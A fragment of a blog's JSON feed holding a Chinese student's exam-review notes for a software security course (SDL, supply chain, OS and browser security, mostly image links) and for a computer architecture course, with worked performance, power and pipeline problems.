src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228153645531.png\" alt=\"image-20221228153645531\"></p>\n<h2 id=\"三种逆向方法比较\"><a href=\"#三种逆向方法比较\" class=\"headerlink\" title=\"三种逆向方法比较\"></a>三种逆向方法比较</h2><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230102234031543.png\" alt=\"image-20230102234031543\"></p>\n<h2 id=\"逆向工程的敌手\"><a href=\"#逆向工程的敌手\" class=\"headerlink\" title=\"逆向工程的敌手\"></a>逆向工程的敌手</h2><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230102234134750.png\" alt=\"image-20230102234134750\"></p>\n<h2 id=\"围绕逆向分析的博弈对抗\"><a href=\"#围绕逆向分析的博弈对抗\" class=\"headerlink\" title=\"围绕逆向分析的博弈对抗 *\"></a>围绕逆向分析的博弈对抗 *</h2><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228154105548.png\" alt=\"image-20221228154105548\"></p>\n<p>具体的内容如下图</p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228154120777.png\" alt=\"image-20221228154120777\"></p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228154131608.png\" alt=\"image-20221228154131608\"></p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228154149766.png\" alt=\"image-20221228154149766\"></p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228154158942.png\" alt=\"image-20221228154158942\"></p>\n<h1 id=\"三、安全的软件开发-SDL\"><a href=\"#三、安全的软件开发-SDL\" class=\"headerlink\" title=\"三、安全的软件开发(SDL) **\"></a>三、安全的软件开发(SDL) **</h1><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228154447041.png\" alt=\"image-20221228154447041\" style=\"zoom: 33%;\">\n\n<h2 id=\"软件安全问题的根源\"><a href=\"#软件安全问题的根源\" class=\"headerlink\" title=\"软件安全问题的根源 *\"></a>软件安全问题的根源 *</h2><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228154550056.png\" alt=\"image-20221228154550056\"></p>\n<h3 id=\"软件-安全-的三大问题-复杂性、互连性、可扩展性\"><a href=\"#软件-安全-的三大问题-复杂性、互连性、可扩展性\" class=\"headerlink\" title=\"软件(安全)的三大问题:复杂性、互连性、可扩展性\"></a>软件(安全)的三大问题:复杂性、互连性、可扩展性</h3><p>复杂性:软件的规模和复杂性无节制增长,影响因素还有代码集成的紧密程度,补丁等,编译连接后的代码库会变大</p>\n<p>互联性:互联网增加了攻击目标的数量,简化了实施攻击的方法,通过网络访问不需要人工干预,很容易启动,当前企业体系结构在互联环境下暴露出越来越多的安全隐患</p>\n<p>可扩展性:可以通过插件等方式提供附加功能,导致难以阻止通过插件引入漏洞</p>\n<h3 id=\"软件开发的三大问题-复杂性、复用性、劣币效应\"><a href=\"#软件开发的三大问题-复杂性、复用性、劣币效应\" class=\"headerlink\" title=\"软件开发的三大问题:复杂性、复用性、劣币效应\"></a>软件开发的三大问题:复杂性、复用性、劣币效应</h3><p>为什么软件是不负责任的? 可以从软件开发的三大问题, 劣币效应这里回答</p>\n<p>因为众多开发商对安全仍然不够重视,更加重视的是产品的功能以及快速上线,抢占市场. 于是产生了劣币排斥良币的现象.</p>\n<h2 id=\"内构安全-build-security-in-x2F-BSI\"><a href=\"#内构安全-build-security-in-x2F-BSI\" class=\"headerlink\" title=\"内构安全(build security in &#x2F;BSI) **\"></a>内构安全(build security in &#x2F;BSI) **</h2><p>​\t\t内构安全是一种协同化努力,通过提供实践、工具、指南、规则、原则及其他资源,让软件开发者、架构师和安全参与人员可以借此在软件开发的每个阶段将安全构建到软件中去</p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228155350390.png\" alt=\"image-20221228155350390\"></p>\n<h3 id=\"软件安全三大支柱\"><a href=\"#软件安全三大支柱\" class=\"headerlink\" title=\"软件安全三大支柱 **\"></a>软件安全三大支柱 **</h3><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228155550112.png\" alt=\"image-20221228155550112\"></p>\n<h3 id=\"支柱一-风险管理\"><a href=\"#支柱一-风险管理\" class=\"headerlink\" title=\"支柱一:风险管理 *\"></a>支柱一:风险管理 *</h3><ul>\n<li><p>在整个SDLC中,<font color=\"red\">识别、评级、追踪</font>风险是软件风险实践的关键</p>\n</li>\n<li><p>安全接触点是与特定类型的RMF结合的最佳实践. 一旦针对特定软件的安全最佳实践“锁定”了一组风险,就会得到适当的处理</p>\n</li>\n<li><p>没有百分百的安全.只有通过实施风险管理,并充分考虑那些受影响的关键商业信息,才能让软件安全走出“技术王国”,为商业带来价值</p>\n</li>\n</ul>\n<h3 id=\"支柱二-安全接触点\"><a href=\"#支柱二-安全接触点\" class=\"headerlink\" title=\"支柱二:安全接触点 **\"></a>支柱二:安全接触点 **</h3><p>软件安全接触点: 在软件开发生命周期中保障软件安全的一组最佳实践</p>\n<ul>\n<li><p>这些接触点从黑帽子(渗透和攻击)和白帽子(防御和保护)两个方面综合考察软件开发中可能出现的问题</p>\n</li>\n<li><p>结合了接触点的软件开发生命周期(SDLC)就成为SDL,可在每个阶段尽可能避免和消除漏洞,同时又保留了熟悉的工作方式</p>\n</li>\n<li><p>它是软件安全的三大支柱的核心</p>\n</li>\n</ul>\n<h3 id=\"支柱三-安全知识\"><a href=\"#支柱三-安全知识\" class=\"headerlink\" title=\"支柱三:安全知识 **\"></a>支柱三:安全知识 **</h3><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228162902379.png\" alt=\"image-20221228162902379\"></p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228162920125.png\" alt=\"image-20221228162920125\"></p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103092133700.png\" alt=\"image-20230103092133700\"></p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103092224532.png\" alt=\"image-20230103092224532\"></p>\n<p>![image-20230103092233471](ucas-软件安全原理-复习&#x2F;image-202301030922 33471.png)</p>\n<h3 id=\"安全知识与接触点\"><a href=\"#安全知识与接触点\" class=\"headerlink\" title=\"安全知识与接触点 **\"></a>安全知识与接触点 **</h3><p>记住这张图,并会进行相关的判断,例如 渗透测试是用来针对需求和使用案例的吗? x</p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228163018072.png\" alt=\"image-20221228163018072\"></p>\n<h2 id=\"软件安全的缺点-缺陷和瑕疵\"><a href=\"#软件安全的缺点-缺陷和瑕疵\" class=\"headerlink\" title=\"软件安全的缺点(缺陷和瑕疵) *\"></a>软件安全的缺点(缺陷和瑕疵) *</h2><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228155636901.png\" alt=\"image-20221228155636901\"></p>\n<p>缺点分为了缺陷和瑕疵,都可以导致漏洞</p>\n<h2 id=\"华为、微软为什么要实施SDL\"><a href=\"#华为、微软为什么要实施SDL\" class=\"headerlink\" title=\"华为、微软为什么要实施SDL\"></a>华为、微软为什么要实施SDL</h2><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103093354333.png\" alt=\"image-20230103093354333\"></p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103093515077.png\" alt=\"image-20230103093515077\"></p>\n<p>针对安全接触点和软件工件,对应哪一部分?</p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103093651054.png\" alt=\"image-20230103093651054\"></p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103093808648.png\" alt=\"image-20230103093808648\"></p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103093832998.png\" alt=\"image-20230103093832998\"></p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103093841206.png\" alt=\"image-20230103093841206\"></p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103093849198.png\" alt=\"image-20230103093849198\"></p>\n<h1 id=\"四、软件全球供应链安全\"><a href=\"#四、软件全球供应链安全\" class=\"headerlink\" title=\"四、软件全球供应链安全 *\"></a>四、软件全球供应链安全 *</h1><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228163423463.png\" alt=\"image-20221228163423463\"></p>\n<p>​\t\t问到软件供应链和前面讲到的三部曲的过程的关系,</p>\n<h3 id=\"案例\"><a href=\"#案例\" class=\"headerlink\" title=\"案例 *\"></a>案例 *</h3><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228163448867.png\" alt=\"image-20221228163448867\"></p>\n<h1 id=\"五、操作系统安全\"><a href=\"#五、操作系统安全\" class=\"headerlink\" title=\"五、操作系统安全\"></a>五、操作系统安全</h1><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103094248246.png\" alt=\"image-20230103094248246\"></p>\n<p>分段、分页</p>\n<p>段保护、页保护</p>\n<p>宏内核、微内核</p>\n<p>固件</p>\n<h2 id=\"操作系统脆弱性和保护机制\"><a href=\"#操作系统脆弱性和保护机制\" class=\"headerlink\" title=\"操作系统脆弱性和保护机制 *\"></a>操作系统脆弱性和保护机制 *</h2><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103101910978.png\" alt=\"image-20230103101910978\"></p>\n<h2 id=\"围绕缓冲区溢出对抗的博弈演进\"><a href=\"#围绕缓冲区溢出对抗的博弈演进\" class=\"headerlink\" title=\"围绕缓冲区溢出对抗的博弈演进 **\"></a>围绕缓冲区溢出对抗的博弈演进 **</h2><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103102019896.png\" alt=\"image-20230103102019896\" style=\"zoom: 25%;\">\n\n\n\n\n\n\n\n\n\n<h1 id=\"六、浏览器安全-B-x2F-S\"><a href=\"#六、浏览器安全-B-x2F-S\" class=\"headerlink\" title=\"六、浏览器安全 B&#x2F;S\"></a>六、浏览器安全 B&#x2F;S</h1><h2 id=\"浏览器参考架构\"><a href=\"#浏览器参考架构\" class=\"headerlink\" title=\"浏览器参考架构\"></a>浏览器参考架构</h2><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103102856110.png\" alt=\"image-20230103102856110\"></p>\n<h2 id=\"同源策略\"><a href=\"#同源策略\" class=\"headerlink\" title=\"同源策略\"></a>同源策略</h2><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103103409271.png\" alt=\"image-20230103103409271\"></p>\n<h2 id=\"攻击面分析\"><a href=\"#攻击面分析\" class=\"headerlink\" title=\"攻击面分析 *\"></a>攻击面分析 *</h2><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103103910817.png\" alt=\"image-20230103103910817\"></p>\n<h1 id=\"七、移动安全\"><a href=\"#七、移动安全\" class=\"headerlink\" title=\"七、移动安全\"></a>七、移动安全</h1>",
            "tags": [
                "研究生课程"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/",
            "url": "https://tangzichengcc.github.io/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/",
            "title": "ucas-计算机体系结构-复习上",
            "date_published": "2022-12-26T08:03:28.000Z",
            "content_html": "<p>​\t\t当初选这门课,就是想打牢计算机基础,没想着真要造CPU…课程确实是有点难度的,所以对于这次期末考试,我的计划是,着重复习重点的知识以及目前和可预见的将来对自己比较重要的章节,至少保证及格!! 然后学到一点东西!</p>\n<h1 id=\"必考题型复习\"><a href=\"#必考题型复习\" class=\"headerlink\" title=\"必考题型复习\"></a>必考题型复习</h1><p><a href=\"https://blog.csdn.net/qq_43840665/article/details/122281422\">https://blog.csdn.net/qq_43840665/article/details/122281422</a></p>\n<p><a href=\"https://f.daixianiu.cn/csdn/4209862890104209.html\">https://f.daixianiu.cn/csdn/4209862890104209.html</a></p>\n<p>本科教材《》</p>\n<p>可以做做本科后面的那个习题</p>\n<h1 id=\"第一二章\"><a href=\"#第一二章\" class=\"headerlink\" title=\"第一二章\"></a>第一二章</h1><h3 id=\"考点-性能、成本、功耗的计算\"><a href=\"#考点-性能、成本、功耗的计算\" class=\"headerlink\" title=\"考点: 性能、成本、功耗的计算\"></a>考点: 性能、成本、功耗的计算</h3><p>性能:根据指令算IPC,两台机器比较性能,那个多长时间执行了多少指令</p>\n<p>成本:硅片成本</p>\n<p>功耗:静态功耗、动态功耗</p>\n<h3 id=\"习题1-性能计算\"><a href=\"#习题1-性能计算\" class=\"headerlink\" title=\"习题1: 性能计算\"></a>习题1: 性能计算</h3><p>在3台不同指令系统的计算机上运行同一程序P时，A机需要执行 1.0 * 10^8 条指令，B机需要执行 2.0 * 10^8 条指令，C机需要执行4.0 * 10^8条指令，但实际执行时间都是10s。请分别计算这3台机器在运行程序P时的实际速度，以MIPS为单位。这3台计算机在运行程序P时，哪一台性能最高？为什么？</p>\n<h3 id=\"解答\"><a href=\"#解答\" class=\"headerlink\" title=\"解答:\"></a>解答:</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">常用指标MIPS(Million Instructions Per Second),每秒钟执行多少条指令. 所以每个数除10s,并且再除10的6次方(百万)</span><br><span class=\"line\">如果看性能的话,还是要比较时间,所以性能一样</span><br><span class=\"line\">A:10MIPS B:20MIPS C:40MIPS</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"基础知识\"><a href=\"#基础知识\" class=\"headerlink\" title=\"基础知识:\"></a>基础知识:</h3><p>​\t\tMIPS并不是很合理,因为没有说明一条指令能干多少事.目前常用的一个性能指标还有MFLOPS,它是指每秒钟做多少个浮点运算.也可能会考,这个指标也有类似的问题,没衡量能做多少事.</p>\n<h3 id=\"习题5-功耗计算\"><a href=\"#习题5-功耗计算\" class=\"headerlink\" title=\"习题5: 功耗计算\"></a>习题5: 功耗计算</h3><p>对某处理器进行功耗测试，得到如下数据：时钟不翻转，电压1.05V时，电流为500mA；时钟频率为1GHz，电压1.1V时，电流为2500mA。请计算在1.1V下，此处理器的静态功耗以及500MHz下的总功耗。</p>\n<h3 id=\"基础知识-1\"><a href=\"#基础知识-1\" class=\"headerlink\" title=\"基础知识:\"></a>基础知识:</h3><p>总功耗 &#x3D; 动态功耗+ 静态功耗</p>\n<p>动态功耗与时钟频率(翻转率)成正比</p>\n<h3 id=\"解答-1\"><a href=\"#解答-1\" class=\"headerlink\" title=\"解答:\"></a>解答:</h3><p>先在时钟不翻转时计算电阻, R &#x3D; U&#x2F;I, R&#x3D;2.1欧姆. 静态功耗是不变的,此时可以计算静态功耗,静态功耗 &#x3D; U*U &#x2F; R  &#x3D; 1.1 * 1.1 &#x2F; 2.1 &#x3D; 0.576w</p>\n<p>我们此时计算出1.1v,1GHz下的动态功耗,然后进行比例计算,就可以得到500MHz下的动态功耗了,</p>\n<p>1.1v,1GHz下的动态功耗 &#x3D; 总功耗 - 静态功耗 &#x3D; U * I - 静态功耗 &#x3D; 1.1 * 2.5 - 0.576 &#x3D; 2.174w</p>\n<p>所以500MHz下的动态功耗 &#x3D; 500&#x2F;1000 * 2.174 &#x3D; 1.087 w</p>\n<p>所以500MHz下的总功耗 &#x3D; 动态功耗 + 静态功耗 &#x3D; 1.087 + 0.576  &#x3D; 1.663w</p>\n<h1 id=\"第三章-二进制与逻辑电路\"><a href=\"#第三章-二进制与逻辑电路\" class=\"headerlink\" title=\"第三章 二进制与逻辑电路\"></a>第三章 二进制与逻辑电路</h1><p>浮点数的表示不考,但是定点数的要考</p>\n<h3 id=\"习题1-定点数的表示\"><a href=\"#习题1-定点数的表示\" class=\"headerlink\" title=\"习题1:定点数的表示\"></a>习题1:定点数的表示</h3><h4 id=\"1-分别给出64位定点原码和补码表示的数的范围\"><a href=\"#1-分别给出64位定点原码和补码表示的数的范围\" class=\"headerlink\" title=\"(1)分别给出64位定点原码和补码表示的数的范围\"></a>(1)分别给出64位定点原码和补码表示的数的范围</h4><p>原码: 最高位符号位 0正 1负</p>\n<p>正: 0~ 2的63次方-1</p>\n<p>负: -(2的63次方-1) ~0</p>\n<p>综上, </p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231153957522.png\" alt=\"image-20221231153957522\"></p>\n<p>补码:</p>\n<p>正:0~ 2的63次方-1</p>\n<p>负:-2的63次方 ~ -1</p>\n<p>综上</p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231153942328.png\" alt=\"image-20221231153942328\"></p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231233557002.png\" alt=\"image-20221231233557002\"></p>\n<h4 id=\"2-在32位定点补码表示中-0x80000000表什么数\"><a href=\"#2-在32位定点补码表示中-0x80000000表什么数\" class=\"headerlink\" title=\"(2)在32位定点补码表示中,0x80000000表什么数\"></a>(2)在32位定点补码表示中,0x80000000表什么数</h4><p>1000 0000 0000 0000 0000  0000  0000  0000  </p>\n<p>这个是补码,转换成原码后再算,</p>\n<p>最高位不变,其余转换,然后最低位+1, 于是得到 32个0和最高位的1,溢出了??????????????</p>\n<p>所以答案是-2的31次方</p>\n<h3 id=\"习题三-画出-e-x3D-a-amp-b-c-amp-d-的晶体管级电路图\"><a href=\"#习题三-画出-e-x3D-a-amp-b-c-amp-d-的晶体管级电路图\" class=\"headerlink\" title=\"习题三:画出 e&#x3D;a&amp;b | c&amp;d 的晶体管级电路图\"></a>习题三:画出 e&#x3D;a&amp;b | c&amp;d 的晶体管级电路图</h3><p>本科教材p184</p>\n<p>解法1:</p>\n<p>首先由N管组成“正逻辑”,串联表示与,并联表示或. 再用P管组成“反逻辑”,串联表示或,并联表示与.最后再把正反逻辑串联</p>\n<p>这得到的是 ~(a&amp;b | c&amp;d ), 可以加一个反相器,</p>\n<img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231161439711.png\" alt=\"image-20221231161439711\" style=\"zoom:33%;\">\n\n<p>解法2: </p>\n<p>先做一个转换,转换成两级与非门的逻辑,然后再画,与非门什么的参考本科教材, 转换的话,记住那些转换公式</p>\n<p> e&#x3D;a&amp;b | c&amp;d  &#x3D; <del>(</del>(A&amp;B) &amp; ~(C&amp;D))</p>\n<p>还是这个做法:首先由N管组成“正逻辑”,串联表示与,并联表示或. 再用P管组成“反逻辑”,串联表示或,并联表示与.最后再把正反逻辑串联</p>\n<p>分别8⃣️</p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231201126197.png\" alt=\"image-20221231201126197\"></p>\n<h3 id=\"习题四-计算一个FO4的延迟-假设反相器的输入电容位0-0036pF-平均每个负载连线电容位0-0044pF-翻转延迟位0-023ns-每pF延迟为4-5ns\"><a href=\"#习题四-计算一个FO4的延迟-假设反相器的输入电容位0-0036pF-平均每个负载连线电容位0-0044pF-翻转延迟位0-023ns-每pF延迟为4-5ns\" class=\"headerlink\" title=\"习题四: 计算一个FO4的延迟,假设反相器的输入电容位0.0036pF,平均每个负载连线电容位0.0044pF,翻转延迟位0.023ns,每pF延迟为4.5ns\"></a>习题四: 计算一个FO4的延迟,假设反相器的输入电容位0.0036pF,平均每个负载连线电容位0.0044pF,翻转延迟位0.023ns,每pF延迟为4.5ns</h3><p>课本p48</p>\n<p>FO4延迟 &#x3D; 本征延迟(本身延迟) + 负载延迟 &#x3D; 0.023 + 4.5((0.0036+0.0044)*4) &#x3D; 0.167ns</p>\n<p>负载延迟又和该电源的负载相关</p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231201615028.png\" alt=\"image-20221231201615028\"></p>\n<h1 id=\"第五章-静态流水线\"><a href=\"#第五章-静态流水线\" class=\"headerlink\" title=\"第五章 静态流水线\"></a>第五章 静态流水线</h1><p>哪个是真相关,哪个是假相关?</p>\n<p>五级流水的时空图,前递 ,有无前递(旁路)</p>\n<p>给几条指令,有无前递的 画出来</p>\n<p>和转移相关的就比较复杂了,</p>\n<p>这里不能够前递是因为取址loadword指令的话需要访存阶段才能够拿到数值吧</p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221226163902930.png\" alt=\"image-20221226163902930\"></p>\n<h2 id=\"空操作指令-nop的作用\"><a href=\"#空操作指令-nop的作用\" class=\"headerlink\" title=\"空操作指令 nop的作用\"></a>空操作指令 nop的作用</h2><p>空操作指令(nop 指令)，其不改变程序可见寄存器、状态寄存器以及内存的状态，以及用于等待需要一定周期执行的操作。nop 指令的作用，常见的有：取指的强制访存对齐（memory alignment），防止相关风险（hazard），以及用于填充延迟槽（branch delay slot）。</p>\n<h1 id=\"第六章\"><a href=\"#第六章\" class=\"headerlink\" title=\"第六章\"></a>第六章</h1><p>执行延迟:统一到这个</p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221226160418121.png\" alt=\"image-20221226160418121\"></p>\n<p>mips 转移指令有延迟槽??</p>\n<p><a href=\"https://blog.csdn.net/weixin_43752162/article/details/122136323\">https://blog.csdn.net/weixin_43752162/article/details/122136323</a></p>\n<h3 id=\"前递-旁路-有哪几种\"><a href=\"#前递-旁路-有哪几种\" class=\"headerlink\" title=\"前递(旁路)有哪几种?\"></a>前递(旁路)有哪几种?</h3><p>mem -》 ex</p>\n<p>ex -〉 ex</p>\n<p>啥叫全旁路??</p>\n<p>load的时候需要在mem才能给前递??</p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231224522974.png\" alt=\"image-20221231224522974\"></p>\n<h1 id=\"mips寄存器\"><a href=\"#mips寄存器\" class=\"headerlink\" title=\"mips寄存器\"></a>mips寄存器</h1><h1 id=\"第七章-多发射\"><a href=\"#第七章-多发射\" class=\"headerlink\" title=\"第七章 多发射\"></a>第七章 多发射</h1><p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230102135923351.png\" alt=\"image-20230102135923351\"></p>\n<h1 id=\"第八章-转移预测\"><a href=\"#第八章-转移预测\" class=\"headerlink\" title=\"第八章 转移预测\"></a>第八章 转移预测</h1><p>今年大概率考那个预测情况,推演?看ppt</p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101151357744.png\" alt=\"image-20230101151357744\"></p>\n<h2 id=\"分析：for-i-x3D-0-i-lt-10-i-for-j-x3D-0-j-lt-10-j-…-的分支预测正确率。（2021复习题）\"><a href=\"#分析：for-i-x3D-0-i-lt-10-i-for-j-x3D-0-j-lt-10-j-…-的分支预测正确率。（2021复习题）\" class=\"headerlink\" title=\"分析：for (i&#x3D;0;i&lt;10;i++) for(j&#x3D;0;j&lt;10;j++){…}的分支预测正确率。（2021复习题）\"></a>分析：for (i&#x3D;0;i&lt;10;i++) for(j&#x3D;0;j&lt;10;j++){…}的分支预测正确率。（2021复习题）</h2><p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101151819819.png\" alt=\"image-20230101151819819\"></p>\n<h2 id=\"分析：for-i-x3D-0-i-lt-10-i-for-j-x3D-0-j-lt-10-j-for-k-x3D-0-k-lt-10-k-…-的分支预测正确率。（2021真题）\"><a href=\"#分析：for-i-x3D-0-i-lt-10-i-for-j-x3D-0-j-lt-10-j-for-k-x3D-0-k-lt-10-k-…-的分支预测正确率。（2021真题）\" class=\"headerlink\" title=\"分析：for (i&#x3D;0;i&lt;10;i++) for(j&#x3D;0;j&lt;10;j++) for(k&#x3D;0;k&lt;10;k++){…}的分支预测正确率。（2021真题）\"></a>分析：for (i&#x3D;0;i&lt;10;i++) for(j&#x3D;0;j&lt;10;j++) for(k&#x3D;0;k&lt;10;k++){…}的分支预测正确率。（2021真题）</h2><p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101223213584.png\" alt=\"image-20230101223213584\"></p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101160414867.png\" alt=\"image-20230101160414867\"></p>\n<p><img 